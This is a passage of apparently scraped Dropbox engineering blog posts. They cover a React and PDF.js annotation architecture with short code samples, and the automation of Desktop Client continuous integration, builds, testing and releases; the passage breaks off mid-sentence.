example. Annotations At Dropbox we use the React JavaScript library for our front end. Annotations have two main React components, which can easily be reused on arbitrary document types: the inline markup itself (the Annotation ) and the corresponding comment bubble (the AnnotationBubble ). The Annotation is a yellow overlay positioned within the document itself that refers to part of its content. Currently, this could be a text highlight or a rectangle. In the future we may add other types, such as freehand shapes or pointers. The Annotation is placed and sized based on user mouse events and must react smoothly while being created. Annotations also must move with the document when it’s scrolled or resized. The second component is the corresponding AnnotationBubble , which has comment text contained in a popup “bubble” which floats near the Annotation . The AnnotationBubble will contain the original comment, along with any replies and a list of users relevant to the conversation. When a user @mentions someone, our CommentComposer React component brings the feedback directly to the attention of a recipient via an email and popup notification. This AnnotationBubble must be visually attached to its Annotation , but must also connect with other Dropbox components, such as the User object, the contact list popup, and the comments list side panel. Integrating annotations with the existing framework One of the most challenging aspects of designing the architecture for annotations was deciding how to bridge the divide between the disjointed ecosystems of the Dropbox FileViewer and the PDF.js iframe. Where should we get mouse events from? Where should we draw the Annotation and AnnotationBubble? Ideally, the Annotation and AnnotationBubble should move smoothly while the mouse interacts with them or the document scrolls or resizes. Also, AnnotationBubble should be able to float over the edge of the document, but the Annotation should be clipped at the edge. For implementation simplicity, we wanted to limit modifications to the third-party PDF.js and do most of our development in Dropbox’s FileViewer. Finally, we needed to be careful about what data we’re sending to and from the iframe. If we relied on too much data flow, performance could be adversely affected. More importantly, we didn’t want to compromise the security provided by the iframe’s encapsulation by sending sensitive user data across to the document. Option 1: All components in the PDF.js iframe One option would have been to customize PDF.js and implement everything within the iframe. The annotation components could be, in every sense, “inside” the document. This means that resizes and scrolls could immediately and seamlessly update the Annotation’s position, no calculations needed. Also, the Annotation would never overflow the bounds of the document, since it would be automatically clipped by the iframe. Although this has huge performance and simplicity benefits, it also has some serious drawbacks: The AnnotationBubble would also be clipped by the iframe, which should instead be allowed to be overlaid across the document bounds to maximize valuable viewport space. There would be a large cost to implementation simplicity. Since all the annotation components would be inside PDF.js, they would have to be compiled into this block of “vanilla” JavaScript, and would be very hard to maintain as PDF.js develops. These components would also be hard or impossible to generalize for non-iframe preview types. Finally, we would have to send all of the necessary information for the comment bubble from the FileViewer ecosystem into the iframe, including a user’s information and their contact list. Sending this sensitive user data across to the iframe would break the FileViewer’s security encapsulation. Although we could’ve overcome the other difficulties mentioned above, preserving security was the main reason an all-iframe implementation wasn’t chosen. Option 2: All components in the parent FileViewer The opposite approach would have been to implement everything in FileViewer , in an overlay on “top” of the iframe. Advantages would include aligning the development process more with the rest of the Dropbox website and allowing for easier code reuse between other Dropbox systems and between document types. Also, information passing between the AnnotationBubble and FileViewer would be trivial and would have no security implications. However, with this approach it becomes very hard to make the Annotation look like a part of the document. Instead of having to transmit bulky user information in JSON via the FrameMessenger as before, we’d have to send streams of fast-moving mouse, scroll, and resize events. The time required for this cross-document communication, along with translation between coordinate systems and manual repaints of the Annotation would cause the Annotation to perceptibly lag behind a user’s mouse or the document’s scroll. Annotations could also flow outside the document’s edges, and the illusion that the Annotation was attached to the document would be impossible to maintain. Option 3: Hybrid solution We found that a compromise between these two options was the best solution, both for code quality and performance. The code for the Annotation is integrated into PDF.js so that relevant mouse events are captured and used right away. Since the Annotation is inside the iframe and attached to the document as a child div , it moves smoothly along with the document when it’s scrolled or resized. The Annotation is also automatically clipped when it overflows the iframe. The AnnotationBubble , however, is in the parent FileViewer , and benefits greatly from direct access to other Dropbox components and data. It also can easily overflow the iframe window, allowing for a better use of viewport space. However, since its position needs to follow the Annotation in the iframe, any movements of the Annotation are sent up through the FrameMessenger and then translated to the viewport’s coordinates. This does introduce a delay in the AnnotationBubble ’s movements, which we mitigate by hiding it when its Annotation is moving. There is also some necessary algorithmic complexity involved in translating positions between the iframe and FileViewer , which we describe in the appendix at the bottom of the post. (In fact, every different type of preview has its own interface for accepting and translating movement events sent from the Annotation to the AnnotationBubble .) This table summarizes the three options above: Option Pros Cons Annotation & AnnotationBubble in PDF.js iframe Annotation smoothly follows document when it scrolls/resizes. Annotation is automatically clipped by the document edge. The AnnotationBubble would be undesirably clipped. Modifying PDF.js is more complex than staying in Dropbox ecosystem. Can’t generalize to non-iframe preview types. Sending lots of user data to iframe breaks security encapsulation and hurts performance. Annotation & AnnotationBubble in FileViewer AnnotationBubble floats over document edge. Implementation is simpler in FileViewer . Can be generalized for non-iframe preview types. Can use existing Dropbox components. Only events would have to be sent across iframe. Annotation would perceivably lag as document scrolls/resizes. Annotation would undesirably flow over the document edge. Compromise: Annotation in PDF.js iframe & AnnotationBubble in FileViewer Annotation smoothly follows document when it scrolls/resizes. Annotation is automatically clipped by the document edge. AnnotationBubble floats over document edge. Most of the implementation can be generalized for non-iframe preview types. Can use existing Dropbox components for AnnotationBubble . Only events would have to be sent across iframe. AnnotationBubble would perceivably lag as document scrolls/resizes (we hide it during movement to mitigate this). Example action flowing through whole system The following example shows how we isolate the preview and how we deal with communication across the iframe. In this scenario, the user has decided to place an annotation on a PDF and has already begun drawing a rectangle by clicking and dragging her mouse across a part of the screen. Now, the user releases the mouse, starting a flurry of events, summarized in the diagram below the animation. (Click to zoom into the diagram) iframe events PDF.js contains the actual document preview and has event listeners set up on the browser’s window object. It receives the mouseup and informs PdfJsAnnotationInterface. PdfJsAnnotationInterface does all of the document type-specific communication between the preview, the more general AnnotationController, and the FileViewer. From here, the event gets passed to the AnnotationController, which determines which Annotation the event gets passed to next (this could be either a new Annotation or one that’s currently being drawn/edited). In this case, AnnotationController knows we’ve previously been dragging the mouse to create a region, so it calls the AnnotationRegion’s onMouseUp callback. The following is a simplified version of the coffeescript code in AnnotationRegion’s onMouseUp callback (the code path specific to this example is bold): Copy AnnotationRegion = React.createClass(\r\n  ... \r\n  # If dragging/resizing, we can stop now. \r\n  # Otherwise, the click happened elsewhere and we just hide the rectangle\r\n  onMouseUp: (event) ->\r\n    if @_isModifying()  # the mouse was just interacting with the region \r\n      # Update the annotation \r\n      @_updateAnnotationFromState()  # updates @annotation dict based on state \r\n      # Call \"Annotation Placed\" or \"End Drag\" depending on whether or not \r\n      # we were just creating the region \r\n      if @state.isInitialCreation \r\n        @props.onAnnotationPlaced?(@annotation)  # back to AnnotationController \r\n      else \r\n        @props.onAnnotationEndDrag?(@annotation)\r\n\r\n      # Disable creation mode\r\n      @setState {\r\n        isInitialCreation: false\r\n      }\r\n      # the mouse was not interacting with the region, \r\n      # so a click outside it tells it to hide.\r\n      else  \r\n        @hideAnnotation(event)\r\n  ...\r\n) 4. The AnnotationRegion’s state contains coordinates set from previous mousemove events. Now it updates its @annotation object based on this state and passes this back to the AnnotationController via the onAnnotationPlaced callback. 5. The AnnotationController takes note that the current AnnotationRegion is done and passes the @annotation back to the PdfJsAnnotationInterface. 6. Now we’re finally ready to send information out of the iframe to the FileViewer! PdfJsAnnotationInterface translates the coordinates in the annotation from PDF points to viewport pixels, packages it up in a JSON message, and sends it over the iframe boundary via FrameMessenger. This is an example of the actual JSON that gets sent across the iframe boundary: Copy payload: {\r\n  action: \"annotation-placed\"\r\n  parameters: {\r\n    pdf_coordinates: [  // original PDF location information\r\n      page: 1\r\n      page_size: {\r\n        height: 790\r\n        width: 610\r\n      }\r\n      coordinates: [\r\n        x: 250.0, y: 540.0\r\n        x: 250.0, y: 360.0\r\n        x: 410.0, y: 360.0\r\n        x: 410.0, y: 540.0\r\n      ]\r\n    ]\r\n    type: 2   // 2 = region\r\n    // text_highlight would contain the selected text for a highlight\r\n    text_highlight: null\r\n    viewport_coordinates: [   // translated viewport pixels\r\n      x: 530, y: 510\r\n      x: 530, y: 870\r\n      x: 830, y: 870\r\n      x: 830, y: 510      \r\n    ]    \r\n  }\r\n} FileViewer events 7. Now in the FileViewer domain, the \"annotation-placed\" JSON message lands in FileViewerInterface, which handles all communication between the preview and FileViewer. 8. From here, the message is passed on up to FilePreviewAnnotations, which is responsible for all FileViewer-side annotation logic. 9. FilePreviewAnnotations updates the commenting Store and it sets up the data necessary for a new AnnotationBubble. Specifically, the Store updates the createAnnotationBubble part of its state, as shown below. Note that since Commenting uses a Flux architecture, the Store only contains the shared     state; it does not actually create the new AnnotationBubble. Copy return Reflux.createStore({\r\n  ...\r\n  onStartAnnotationCreation: ({annotation}) -> \r\n    @setState({\r\n      # createAnnotationBubble contains information for creating \r\n      # the AnnotationBubble for a new Annotation \r\n      createAnnotationBubble: { \r\n        annotation: annotation \r\n        showBubble: true \r\n      } \r\n    }) \r\n  ... \r\n}) 10. The new AnnotationBubble is created in FilePreviewOverlay , which listens for updates in the Store. When Store.createAnnotationBubble changes, FilePreviewOverlay receives this update. As a result, it positions and creates a new AnnotationBubble . 11. The user then types a comment into the AnnotationBubble and hits “Post”. 12. This triggers an event in ActionCreators.addAnnotation. While the Store contains global state in the Flux paradigm, it is ActionCreators that handles global actions, including side effects and I/O. ActionCreators.addAnnotation actually saves the annotation and comment to Dropbox’s back-end data centers. 13. If the save is successful, ActionCreators updates the Store, clearing Store.createAnnotationBubble. 14. Like before, FilePreviewOverlay hears this update and hides the AnnotationBubble. Conclusion The information cascade in the above example was started by a single user mouse action, and multitudes of other events are fired continuously as the user interacts with the preview. Events also go in the reverse direction, as FileViewer needs to inform the iframe of higher-level actions such as the user turning commenting on or off. To make the annotations system react smoothly and sensibly to all of this input, we needed to bridge the gap between our intentionally isolated document preview and the broader Dropbox environment. As explained above, we kept the purely visual Annotation simple and attached it directly to the document to maximize its performance. The information-heavy AnnotationBubble was kept outside and a flexible interface was made to connect them. This separation of components and use of interfaces made it easy to gracefully extend this implementation for image files, and will make annotations possible on many more file types in the future. Try out annotations on a sample file today! Appendix: Coordinate translation between iframe and FileViewer For PDFs, the decision outlined above to split annotations between the iframe and FileViewer meant that coordinates would have to be translated between two different systems: PDF points and viewport pixels. Screenshot 2016-10-12 14.06.56.png On PDFs, positions are expressed in relation to a physical printed document. Each position is measured from the bottom left corner of a page and expressed in “points” (one of which equals 1/72 of an inch on a printed page). Conversely, positions in the viewport are measured from the top left of the viewer’s viewport and expressed in pixels. When translating from PDF points in the iframe to pixels in the viewport, the current page and scroll position of the document both need to be taken into account to calculate an offset. Also, the vertical component of the point needs to be reversed. Finally, the zoom level of the document is used to determine the multiplier required to complete the translation to viewport pixels. All of this translation is required every time the Annotation moves, whether the movement is caused by the user drawing the Annotation , scrolling/resizing the document, etc. This position information is sent as a stream of information from the iframe to the FileViewer . Information is also passed in the other direction, from the FileViewer to the iframe. For example, a message is passed down when a user changes the visibility of all comments on a document, or when the user interacts with the AnnotationBubble to post or delete a specific comment. Fortunately, all these simple messages are fast to transmit, resulting in no performance issues. // Tags Application Annotations Web Pdfs Previews // Copy link Link copied Link copied", "date": "2016-11-30"},
{"website": "Dropbox", "title": "Accelerating Iteration Velocity on Dropbox’s Desktop Client, Part 1", "author": ["Amandine Lee"], "link": "https://dropbox.tech/application/accelerating-iteration-velocity-on-dropboxs-desktop-client-part-1", "abstract": "Motivation The previous model Today How did we do it? 1. Improving Continuous Integration Next Time Motivation Imagine you’re an engineer working on a new product feature that is going to have a high impact on the end user, like the Dropbox Badge . You want to get quick validation on the functionality and utility of the feature. Each individual change you make might be relatively simple, like a tweak to the CSS changing the size of a font, or more substantial, like enabling the Badge on a new file type. You could set up user studies, but these are relatively expensive and slow, and are a statistically small sample size. Ideally, you write some code, add it to the codebase, have it tested automatically, and then release it immediately to some users so you can gather feedback and iterate. Now imagine you’re the engineer responsible for maintaining the code platform. Every code change and every new version requires you or someone on your team to do a piece of work. You need to make sure that any random commit doesn’t break the development environment for everyone, that the machines that compile code are up and running, and that mysterious bugs are found and routed to the correct engineer to fix before a new version is released to the world. For the Dropbox Desktop Client, this also means keeping up lightning-fast sync rates, making sure core workflows (like sign-in) still function, and minimizing crashes. Ideally, you want to minimize manual operations work, and you want product quality to be high. This can create conflict. The product engineer wants to release as quickly as possible, with ambitious new ideas. The platform engineer doesn’t want to stay until 10pm everyday to make that happen, or to have to constantly say no to the product engineer because changes are too risky to product quality. How do we keep these two types of people in harmony? At Dropbox, the Desktop Client development and deployment schedule previously took 8 weeks per major release, with more than 3 full time engineers required to orchestrate everything. The experience was unpredictable for engineers, because there were frequent rollbacks and delays, and it took a lot of time to figure out and fix the source of new bugs and test failures. It would take up to 3 days before a product engineer’s code reached an internal user and 10-18 weeks before it was fully released. With improvements in our process and systems, we are now operating on a 2-week cadence. Most of the release process is handled by a Technical Project Manager with two engineers who assist part-time, and debugging work is quickly routed to the responsible team. Code is sent to internal users within one business day, and to everyone within 2-4 weeks. The rest of this post (and the next post in this series) talks about how we achieved this remarkable improvement. The previous model In 2015, the Dropbox Desktop Client targeted a cadence of releasing a new major version every 8 weeks. It took 10-18 weeks from when code was added to the main branch of the codebase until the feature was deployed to 100% of Desktop Client users. To quote from old documentation, the \"long cycle time is to ensure that we are not putting insecure or very broken code on our users' machines, because auto-update is a slow and imperfect process.” Here is a summary of that process: Integrating new code The Release Engineering team, responsible for the infrastructure on which test suites and build scripts ran, had at least one and up to three full-time people dedicated to operations work to keep the machines that allowed engineers to commit new code running. Making builds Compiling a new version of Dropbox was the responsibility of a specific engineer, who was the “Primary On-Call” for the Desktop Client team. Their day looked like this: Arrive to work. Choose a commit on which to make a new build. Do some manual tasks to incorporate new translations and tag the commit as the new official version. Push to the build machines, which would make new official Dropbox binaries. Troubleshoot the build machines and retry the build-making process if anything went wrong. Download and do some basic testing on those binaries. Adjust internal configuration parameters to serve the new build to the appropriate group. Send out any communications to announce the new build. This meant writing up an internal email with the commit log, and if the build was going to be posted to Dropbox Forums , a forum post. Spend the rest of the day filing, investigating, and triaging any bug reports that came in. If there was a sufficiently big issue, set the configuration back to a known good build. Do steps 1 - 4 again to make a new build with the desired fix. Troubleshooting issues Another engineer, the Sync On-Call, would specifically be in charge of possible sync-related issues. The Sync On-Call and Primary On-Call together would do an initial investigation to either solve the problem or assign it to a person who would. There were three versions of Dropbox being served at any given point of time: the “office” build, which was just for internal users; “forums” build, which external users could beta-test; and “stable”, the version currently given to the world. Keeping track of all three was assumed to take up both On-Calls’ entire weeks, but was more difficult for newer engineers without as much context. Issues could easily take several days until their root causes were uncovered and fixed, so each major version of Dropbox spent weeks in each stage. Rolling out A third engineer, called the Release Manager, would keep track of all issues that needed to be quashed before a specific major version could be released to the general public, stewarding it over the entire 8 week release cycle. They often had a big feature going out into that release, and had a perk of assigning a codename. (Crowd favorite: “The Kraken”). The Release Manager made sure all problems were resolved before rollout, and kept track of a complicated set of deadlines: Feature freeze: no new features added to the codebase. String freeze: no new user-facing strings, to allow time for translations. Code freeze: no non-critical code changes. Manual test pass: QA Engineers go through a spreadsheet of workflows to verify functionality. Rollout: Increasing segments of user receive the new build. Any of these phases could turn an issue big enough to halt the release train, and after a fix often required going through various parts of the process again. This meant high process complexity, and a possibly large matrix of code combinations that needed to be tested. Engineers were cautioned only to make code changes that would improve the quality of the product after feature freeze (for example, fixing small bugs), but if you missed a release, you would have to wait a full 8 weeks longer until your code shipped to the world. This created pressure to scramble to hit a specific version, and furthermore, even a seemingly safe change could have unexpected side effects. At this time, there were only about 30 engineers working on Desktop Client, meaning a tenth of the team was responsible for doing the often manual or organizational tasks necessary to keep the release trains running. We knew we wanted to speed up innovation on Desktop Client, but more engineers meant more changes per week, and more potential bugs that had to be tracked down per release. Further, the development environment required so much undocumented context that it was difficult for engineers working on other parts of the Dropbox to only work as a ‘part time’ Desktop Client engineer. These existing tools and processes were unscalable. Something had to change. Today As of this writing, new major versions of the Desktop Client are released every two weeks, with around 90 different engineers from dozens of teams contributing to each new release. An engineer working on a product feature usually sees their code in a Dropbox binary in front of some kind of user within 1 business day; their code is fully released within 28 days. Internal builds are automatically made and released daily, and external builds are automatically made and released as scheduled or necessary, stewarded by a single Technical Project Manager with two rotating engineers assisting part time, one to troubleshoot releases if necessary and one to keep an eye on the build system. How did we do it? Our efforts had two overarching themes: Reduce KTLO . “Keep The Lights On” is the Dropbox term for overhead required to maintain the current level of service. Often, it is work that requires precision but not intelligence, and therefore isn’t much fun for a human to do, is easy to mess up, and scales linearly with our product/code-change/release velocity. Automatically affirm quality . One engineer running code on a local machine is great - but Dropbox supports dozens of platforms, and users have infinitely inventive ways of poking and prodding the product. We try to catch as many edge cases as possible automatically ahead of time, and keep an (automatic) eye out in the field. In these blog posts we’ll detail the steps Dropbox’s Desktop Platform team took to accelerate our release process, while maintaining high product quality. These “steps” were not discrete - often they had be worked on in parallel for maximum leverage, each multiplying the effectiveness of the other. 1. Improving Continuous Integration When the project began in early 2016, Dropbox had Continuous Integration (CI) across the organization — engineers committed code to the same mainline branch in each codebase on a regular basis, and each commit kicked off a suite of test and builds. Generally speaking, as a software organization grows, CI and well-written test suites are the first line of defense for automatically maintaining product quality. They document and enforce what the expected behavior of code is, which prevents one engineer (who may not know or regularly interact with everyone who commits code) from unknowingly mucking up another’s work — or from regressing their own features, for that matter. Our test and build coordinator is a Dropbox open source project called Changes , which has an interface for each suite that looks this: Each bar represents a commit, in reverse chronological order. The result could be totally-passing (green) or have at least one test failure (red), with occasional system errors during the run (black). The time it took to run the job is represented by the height of the bar. Engineers were expected to commit only code that would pass the full test suite by testing locally. If a build went red, the On-Call for that area of code would play “build cop”, tracking down the failures and resolving the issue. This involved identifying the breaking change, asking the author to fix it quickly, or backing out the commit themselves. This troubleshooting could take a significant amount of time, while the test suite remained red and engineers committing new code would get emails notifying them of test failures. Errored builds were sometimes the fault of new code, and sometimes due to external problems, adding another layer of complexity. Engineers quickly learned that if you got a failure email, it likely wasn’t due to your change. They no longer trusted the system, and weren’t incentivized to investigate every failure in detail, so multiple failures could pile up before the On-Call untangled them. Untangling these build failures is KTLO work. To automate the job of ensuring that every single change passed the tests, Dropbox built a “Commit Queue” (CQ). Engineers submit new commits to the CQ, which run a suite of tests with the new commit incorporated into the codebase. If they passed, the CQ permanently adds the commit; if the tests failed, the commit is rejected and the author notified. The Commit Queue also ran tests on a greater set of environments than a single engineer could have on their laptop. An implementation of a commit queue had been running on the Server codebase since 2015, but using it for Desktop Client had two dependencies: A. Unifying technology across codebases The Server codebase had migrated to Git (from Mercurial) to reflect current trends in version control in 2014. Naturally, as they tackled similar issues and created new tools, those tools only explicitly supported Git. While we could have invested in improving the Server toolset to support Mercurial workflows, we ultimately decided instead to migrate the Desktop Client repo to Git. Not only would this enable us to leverage the work of our peer engineers, it also removed a point of daily friction faced by engineers committing code within both repos. This actually hints at a greater trend within Dropbox. The Dropbox EPD (Engineering, Product, and Design) organization had transitioned into explicit “Product” and “Product Platform” groups at the very beginning of 2016, rather than “Desktop”, “Web”, “Android”, etc. teams that did a combination of product and platform work. One benefit was obvious: it allowed us to specifically invest in platform goals like performance and ease of development, and free up product initiatives to be cross-platform. An additional side-benefit is that it put engineers with similar considerations across different codebases closer together organizationally, so that they could cross-pollinate and leverage the same set of tools. B. Reducing baseline flakiness Blocking developers from landing broken commits is great, but how do you know for certain a test failure is actually a real product bug, and not just noise? More trickily, what do you do about transient “flaky” failures that only occur infrequently when the test is run? There are two possible categories of reasons why a build would fail when the underlying code hadn’t regressed functionality: infrastructure flakiness (unreliability in the systems or code that run test jobs) and test flakiness (tests that fail some of the time, often non-deterministically). We had to hammer out a significant amount of both, or engineers would spend all their time waiting for their code to be merged. Or, they might retry preemptively, increase load on the infrastructure, and potentially cause cascading failures. Test Flakiness Say you have a test that fails, non-deterministically, around 10% of the time, maybe due to a race condition. If you run it once in Commit Queue, most likely it will get through without a problem, and then fail every 10 builds or so there after. This will cause red builds in the post-commit runs, and occasionally block unrelated changes in Commit Queue. Both of these lead to a really bad developer experience, especially as flaky tests pile up and one test here or there fails, unrelated to your changeset, on every single run. Sometimes the flakiness is a badly written test, with a timeout that is too short and therefore triggers when the code being tested is doing just fine. Sometimes the flakiness is caused by state left over from a previous test that interferes with the current one, like a database entry. At Dropbox, tests are run in random order, so the same failure can show up as problems across the test suite. Sometimes the feature being tested is flaky, i.e., a window is supposed to open after a button click, but only does so some of the time. Categorizing these intermittent failure types is challenging for a human, let alone an automated tool. How do we identify flakiness? For one, we can re-run a test multiple times. The limiting factor is the total wait time for the test job, or if the the tests are sharded across multiple machines to reduce duration, the compute infrastructure costs of running the test suite. We configured Commit Queue to run a new or edited test many times as it is being committed, and reject a change if any of them fail. That should alert the authoring engineer that something needs to be fixed. From there, this engineer has the most context to figure out whether the product or the test (or both) is at fault. Once a test has passed Commit Queue, we run it up to three times post-commit and on unrelated changes, and count any success as “green”. However, because Commit Queue allows intermittent failures once a test is admitted to the general pool, we have to identify tests that recently started flaking and alert the corresponding engineer. For this, we have an additional tool called Quarantine Keeper that removes tests from the main pool if they fail too often, and files a bug against the engineer tagged as the owner of the test to fix and re-add to circulation. The overall goal is to try and keep signal to noise high; very unpredictable random one-off failures should not be alarming, but consistent occasional failures should be eliminated. Infrastructure flakiness Ironing out the build infrastructure flakiness meant systematically cataloging and fixing the types of failures — making sure that timeouts are set to appropriate intervals, adding retries where necessary, etc. The most impactful change we made was implementing a full-job retry to every job. If the network flaked momentarily in the beginning of the build, there was no reason to fail right off the bat — anything that failed for infrastructural reasons before 30 minutes were over was retried up to a total of 3 times, and it had a big impact on the greenness of our builds. Meanwhile, we had to get serious about running a distributed system, including measuring and anticipating the computational requirements to run the test and compilation jobs. The Dropbox Desktop Client is officially supported on over a dozen operating system versions, spread across Windows, Mac, and Linux. A lot of developer pain previously came from having to run tests across all these platforms by hand, so a coupled goal for all of this was increasing the number of OSes we had CQ coverage on. However, the more configurations we ran automatically, the more surface area for flakiness to manifest itself on any given commit, gradually eroding trust in the CI even as we worked to reduce many sources of flakiness since the beginning of the project. Further, we had to be careful because if we enabled more jobs types than we could support, we could easily push the machines that ran the jobs past their limits and cause across-the-board failures. One set of particularly interesting scaling-pains incidents occurred when rsync and git clone commands would mysteriously hang on Windows and Linux (but not Mac OS X) — and seemed to do so at a higher rate when more code was being committed. It turned out that the problem stemmed from the fact that our Windows and Linux Virtual Machines (VMs) shared the same network-attached storage device, while Mac OS X used different hardware. As we began supporting more test types, we were maxing out the disk I/O capacity of this machine, so rsync calls that simply copied files from one VM to the next would do both ends of the transfer on the same machine, overloading it, and fail! Thankfully we were able to fix it by removing some test types out of Commit Queue until we were able to upgrade our machine. Next Time In our next blog post on this topic, we will discuss the technological and process changes required to speed up making new builds and releasing with confidence. // Tags Application Iteration Operations Continuous Integration Testing Desktop Client // Copy link Link copied Link copied", "date": "2017-03-22"},
{"website": "Dropbox", "title": "Accelerating Iteration Velocity on Dropbox’s Desktop Client, Part 2", "author": ["Amandine Lee"], "link": "https://dropbox.tech/application/accelerating-iteration-velocity-on-dropboxs-desktop-client-part-2", "abstract": "2. Automated official builds 3. Automated integration testing 4. Monitoring and metrics during rollout Release Gating Metrics Larger experimental user pools 5. Triage routing 6. Safeguarding the stabilization period The Triage Council Code gating In summary In our previous blog post on investing in the Desktop Client platform at Dropbox, we discussed the challenges of trying to innovate and iterate on a product while maintaining high platform quality and low overhead. In 2016, Dropbox quadrupled the cadence at which we shipped the Desktop Client, releasing a new a major version every 2 weeks rather than every 8 weeks by investing in foundational improvements. These efforts tended to illustrate one or both of the following themes: Reduce KTLO work : “Keeping The Lights On,” or KTLO, includes manual tasks such as setting configuration parameters, running scripts, and figuring out the right person to send a bug to. We strove to automate or eliminate these tasks. Automatically affirm quality : Use testing and monitoring to establish confidence in code correctness and performance, so that releases can happen without anxiety. The previous post described the improvements that we made to Continuous Integration , i.e., the tools that allow engineers to commit code frequently to the same codebase without breaking each others’ tests. This article will talk about the new (or significantly improved) processes and technologies that we implemented for the rest of code’s life cycle: building and testing new binaries, getting them out the door, and making sure they work in the wild. 2. Automated official builds Enhancing Continuous Integration reduced a lot of developer agony. With a more reliable CI system, they could commit code more quickly, know that their tests pass across the wide number of platforms that Dropbox supports, and be safeguarded against future regressions. However, in early 2016, an on-call engineer still spent 8+ hours a week executing scripts, changing configurations, and writing emails to make and release new official Desktop Client builds. This was costly, and not much fun for the engineer. Meanwhile, thanks to the CI, we no longer required an engineer to track down test failures and decide which commits would make it into a release, because almost every commit had passing tests and was releasable. Build-making was thus a prime candidate for automation! To start, we began with the highest impact area: “internal alpha” builds, meaning binaries intended for internal “ dogfooding ” by Dropboxers. Internal alpha was the highest impact because we wanted to make builds for this group of users most frequently, as it was (and continues to be) the first destination for new code changes. It’s the first source of realistic feedback for developers. In addition, we were fine with shipping internal alpha builds that had passing unit tests but no manual quality assurance; if there were unexpected issues, Dropboxers could contact the responsible engineers directly. And if the new internal alpha build was completely unusable, IT could help us do complete reinstalls of Dropbox at the company — though the development of DropboxMacUpdate and its equivalent on Windows had drastically reduced this risk. Automating builds was not ground-breaking new technology, but it required pulling together a bunch of disparate parts of our ecosystem. For example, we added an authenticated API endpoint to configure the official build numbers served via autoupdate, which had previously only been accessible via a web interface. We hooked into Changes , our build-job orchestration framework, to check the status of tests and builds. We called the API for Phabricator , our task tracking and code review tool, to make and check tasks that humans could open or close to indicate blockers to release. We also wrote templated emails and Slack messages to communicate status. We were able to completely automate internal alpha builds by late March 2016, and in the process increase the release cadence to once a day! There were a few main takeaways from this project: Automate the most annoying points of manual work first. Then work outwards, automating tasks based on their impact-to-effort ratios. For example, refreshing our dashboard to figure out when all the jobs were done for a specific build was time-consuming and boring. It was relatively easy to write an endpoint that polls this status and then emails a person with the result. In contrast, actually setting the official build number configuration was relatively unobtrusive for an individual, but sensitive from a security perspective, so it was worthwhile to be slower and more careful developing automation for it. Write really good unit tests for your tools, too. When we began writing code to automate the build making process, we had to make sure it actually worked. We could run the code to kick off a new official version of the Desktop Client 10 times a day to test it end-to-end – but the flurry of builds would confuse engineers, add load to our build infrastructure, and potentially be a bad experience for our internal users as they repeatedly autoupdated. Plus, we would end up with the same familiar bad cycle from product code: every change had to be followed up with a manual test. We made improvements to CI in part 1 precisely to avoid manual testing! Therefore, it was worth the investment to write a robust unit test suite for the build automation tools. Don’t tie things together if they don’t need to be tied together. This should be an obvious software engineering principle — separation of concerns, do one thing well, etc. But when automating a manual process, it’s easy to implement what a human would have done by having a computer do exactly the same thing. In our case, an engineer would arrive in the morning, kick off a build, test it, and deploy. So, our first iteration of build automation was a monolithic script that did all those things in exactly that order, and failed if any part didn’t succeed. As mentioned in Pt 1, capacity was a bottleneck at the time, so retrying the whole script added load and dragged down the overall CI and impeded engineers’ ability to commit code. To help with this, we began running the “build” aspect of the process early in the morning when load was low. However, we still wanted to wait until work hours in SF to deploy a build. Otherwise, if there was a significant problem, either a desktop engineer would have to be disturbed in the off-hours, or Dropboxers using an internal build in other parts of the world wouldn’t be able to use Dropbox. Breaking up the script into its component parts, i.e., making the build early in the morning but delaying deployment until later in the day — solved both problems effectively. 3. Automated integration testing After builds were automated, we had fixed two of the big manual parts of trying to get new versions out of the door: keeping tests green so that we could ship on any commit, and kicking off and deploying builds. However, in the old system, an on-call Desktop Client engineer still ran a basic test set of install, update, and sync — by hand. Note that this person was a Software Engineer, not a Quality Assurance Engineer who specialized in testing. We had made the decision to ship with only unit tests for internal users, but since there were large regressions sometimes, we weren’t willing to do the same for external “beta” users. Enter the Desktop Client Test Infrastructure team. Their mission was to automate end-to-end tests. Their challenge was that larger-scope tests have more opportunities for system flakiness. Here are a few examples of those challenges: Our integration tests run against the production server, meaning that issues in a different part of Dropbox can cause failed client tests. The tests run against a wide variety of platforms. For example, implementing a hook into the user interface (e.g., to click a button) is different across every platform. They also had to account for the third party programs that Dropbox interacts with to test things like the Dropbox Badge. The integration tests were “realistic”, but only used a small set of test users to run. This introduced an insidious bug — a typical user wasn’t logging into hundred of different instances of the Desktop Client per day. The flow by which a user logs into a specific Desktop Client instance, or “host”, is called “linking”. On the server side, there was logic that loaded and traversed a list of every single previous host each time a new host was linked to a user. This caused HTTP 500 service errors from the server that were not seen by regular users! To try and control, and then quash, flakiness, the Test Infra team strategically and incrementally stabilized the framework. First, they ran a basic sync test continuously, fixing issues as they came up, until there were 1000 consecutive passing test runs on each platform. Then, they gradually expanded the scope of tests, making sure that each new coverage area was stable before moving on. Once the first set of tests were written, the other big challenges were in process and culture: Evangelizing the integration test framework. When writing the basic suite of integration tests, the Test Infrastructure put a lot of effort into making a generalized framework that other teams could use to test their new feature. However, product engineers, who primarily want to write and ship product code, had to be convinced that it was a worthwhile investment to write end-to-end tests. Therefore, the Test Infra team conducted onboarding sessions and provided support. Eventually, integration tests caught enough bugs to prove their worth and they became the cultural norm. Generating trust and ownership. Developers at Dropbox already wrote unit tests, understood them, and trusted the unit test framework enough to assume a failure was their responsibility to fix. In contrast, a product engineer who wrote a new integration test that failed was more likely to assume the framework was at fault, and assume that the Test Infrastructure team should investigate first, as they were responsible for the framework. This generated a lot more work for the Test Infra team. Debugging failures. The integration test framework is relatively “thick”, with more code and Dropbox-specific customization than the test tool Pytest on which it is built. This means that engineers who want to debug a failure have more to learn. So, the Test Infra team put together a debugging playbook to spread the knowledge, and put a lot of effort into trying to make failures easier to understand and fix. Triaging potential flaky failures. First, the quarantine logic discussed in Part 1 that came with our unit test suite needed to be ported over to integration tests — and as previously mentioned, the large surface area of integration tests makes flakiness even more probable. Second, routing and fixing flaky or failing tests once they occurred required additional cultural change and process. (See the “Triage Routing” section below for more about how this reflects other considerations of distributed development.) 4. Monitoring and metrics during rollout Once a new version of Dropbox is launched, we want to make sure that it’s working well on real user computers. Since at least 2008, Dropbox has used Community Forums to post new Desktop Client builds for enthusiasts to try and give feedback. Our beta testers are thoughtful and have surfaced many issues, but as of early 2016, investigating a specific reported issue is relatively difficult. For one, issues on the forums take the form of prose posts and tend to describe symptoms of the problem through product behavior. From only one report, the underlying issue is often difficult to isolate as it could have happened at any time and be caused by any component. In addition, forums posts are designed for answering questions and community discussion, so they are aggregated by user-defined topics, rather than timestamps or automatically detected content. To find all related reports of an issue, an 